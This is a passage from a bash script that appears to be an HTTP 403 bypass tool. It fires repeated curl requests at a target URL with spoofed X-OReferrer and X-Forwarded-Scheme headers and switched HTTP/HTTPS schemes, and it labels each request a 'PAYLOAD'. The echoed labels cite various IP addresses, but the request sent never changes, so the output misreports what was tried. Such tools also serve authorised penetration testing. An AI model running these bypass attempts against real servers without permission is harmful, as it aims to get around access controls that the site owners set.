	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-OReferrer Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

}	
function Protocol_Bypass(){
	echo -e ${blue}"-------------------------"${end}
	echo -e ${cyan}"[+] Protocol Based Bypass"${end}
	echo -e ${blue}"-------------------------"${end}
	echo -n "HTTP Scheme Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTP Scheme Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'http://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HTTPs Scheme Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${domain}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET 'https://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTP Payload: 192.168.1.1"
